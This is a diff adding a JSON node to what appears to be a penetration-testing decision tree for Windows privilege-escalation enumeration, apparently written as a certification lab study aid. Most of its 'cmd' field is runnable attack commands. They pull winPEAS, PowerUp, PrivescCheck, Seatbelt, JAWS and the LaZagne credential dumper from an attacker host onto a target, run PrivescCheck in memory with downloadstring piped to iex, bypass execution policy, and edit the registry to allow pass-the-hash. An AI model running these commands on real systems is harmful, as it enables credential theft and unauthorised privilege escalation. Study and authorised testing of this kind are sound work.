@@ -1,0 +1,34 @@
+{
+  "id": "winpeas",
+  "phase": "WINDOWS",
+  "title": "WinPEAS + Automated Enum",
+  "body": "Run winPEAS but never rely on it alone. Module 17.1.5: winPEAS missed the meeting note, PSReadline history, and transcript file — the exact vectors that led to privesc. Use it for speed, supplement with manual checks.",
+  "cmd": "# ── TRANSFER WINPEAS ─────────────────────────────────\n# On Kali:\ncp /usr/share/peass/winpeas/winPEASx64.exe .\npython3 -m http.server 80\n# On target:\niwr http://$lhost/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe\n.\\wp.exe\n\n# ── READ OUTPUT ──────────────────────────────────────\n# RED   = misconfigured / special privilege — investigate immediately\n# GREEN = protection enabled / well configured\n# Focus areas in order:\n# 1. Current user privileges (SeImpersonate etc)\n# 2. Users and groups\n# 3. Password files in home dirs\n# 4. Services — unquoted paths, weak perms\n# 5. Scheduled tasks\n# 6. AlwaysInstallElevated\n# 7. Installed software versions\n\n# ── WINPEAS KNOWN GAPS (Module 17.1.5) ──────────────\n# winPEAS MISSED on CLIENTWK220:\n# - asdf.txt on dave desktop (meeting notes with password)\n# - PSReadline history file with Set-Secret password\n# - Transcript file in C:\\Users\\Public\\Transcripts\n# Always do manual checks even after running winPEAS\n\n# ── POWERUP ──────────────────────────────────────────\niwr http://$lhost/PowerUp.ps1 -OutFile C:\\Windows\\Temp\\pu.ps1\n. .\\pu.ps1\nInvoke-AllChecks\n\n# ── PRIVESCCHECK ─────────────────────────────────────\niwr http://$lhost/PrivescCheck.ps1 -OutFile C:\\Windows\\Temp\\pc.ps1\npowershell -ep bypass -c \". .\\pc.ps1; Invoke-PrivescCheck\"\npowershell -ep bypass -c \". .\\pc.ps1; Invoke-PrivescCheck -Extended\"\n\n# ── SEATBELT ─────────────────────────────────────────\n# Download precompiled (r3motecontrol repo is most reliable):\n# On Kali:\n# wget \"https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe\"\n# python3 -m http.server 80\n# On Windows:\niwr http://$lhost/Seatbelt.exe -OutFile C:\\Windows\\Temp\\sb.exe\nUnblock-File C:\\Windows\\Temp\\sb.exe\nC:\\Windows\\Temp\\sb.exe -group=all\nC:\\Windows\\Temp\\sb.exe InstalledProducts\nC:\\Windows\\Temp\\sb.exe -group=system -outputfile C:\\Windows\\Temp\\seatbelt.txt\n\n# ── JAWS ──────────────────────────────────────────────\n# Download:\n# wget \"https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1\"\niwr http://$lhost/jaws-enum.ps1 -OutFile C:\\Windows\\Temp\\jaws.ps1\npowershell -ep bypass -c \". C:\\Windows\\Temp\\jaws.ps1\" | Tee-Object -FilePath C:\\Windows\\Temp\\jaws.txt\n\n# ── LAZAGNE — credential dumper ────────────────────────\n# Dumps creds from browsers, git, wifi, windows vault etc\n# wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe\niwr http://$lhost/LaZagne.exe -OutFile C:\\Windows\\Temp\\lz.exe\nUnblock-File C:\\Windows\\Temp\\lz.exe\n.\\lz.exe all > C:\\Windows\\Temp\\lazagne.txt\ntype C:\\Windows\\Temp\\lazagne.txt\n\n# ── PRIVESCCHECK EXTENDED (HackTrack method) ───────────\n# In-memory — no file drop needed:\n(new-object net.webclient).downloadstring(\"http://$lhost/PrivescCheck.ps1\") | iex\nInvoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML\n\n# ── LOCALACCOUNTTOKENFILTERPOLICY ──────────────────────\n# Controls UAC remote token filtering for local admins\n# 0 (default) = local admins treated as standard users over SMB/WinRM\n# 1 = local admins get full admin token remotely (needed for PTH)\nreg query \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\" /v LocalAccountTokenFilterPolicy\n# Set to 1 to enable full remote admin (requires admin):\nreg add \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\n\n# ── WES-NG (kernel exploits from systeminfo) ─────────\nsysteminfo > C:\\Windows\\Temp\\sysinfo.txt\n# Transfer sysinfo.txt to Kali then:\n# python3 wes.py --update && python3 wes.py sysinfo.txt",
+  "warn": "winPEAS is fast but NOT comprehensive. Always check PSReadline history, transcript files, and desktop/home dirs manually — winPEAS consistently misses these. Red findings are high priority but manual enum often finds the actual path.",
+  "choices": [
+    {
+      "label": "SeImpersonatePrivilege found",
+      "next": "token_privs"
+    },
+    {
+      "label": "Unquoted service path found",
+      "next": "unquoted_service"
+    },
+    {
+      "label": "AlwaysInstallElevated found",
+      "next": "always_install_elevated"
+    },
+    {
+      "label": "Weak service permissions",
+      "next": "weak_service"
+    },
+    {
+      "label": "Stored creds / SAM",
+      "next": "windows_creds"
+    },
+    {
+      "label": "Nothing clear — check PS history/transcripts",
+      "next": "windows_post_exploit"
+    }
+  ]
+}
